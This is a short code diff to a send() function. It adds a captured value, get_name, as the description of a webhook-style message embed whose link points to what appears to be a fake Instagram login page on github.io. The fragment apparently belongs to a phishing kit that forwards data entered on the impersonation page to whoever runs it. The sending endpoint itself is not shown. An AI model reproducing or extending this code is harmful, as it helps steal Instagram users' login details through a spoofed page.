@@ -10,6 +10,7 @@ function send(){
     {
       "title": "b",
       "url": "https://instaposts.github.io/instagram-login/login.html",
+      "description": get_name,
       "color": 31228,
       "author": {
         "name": "a"
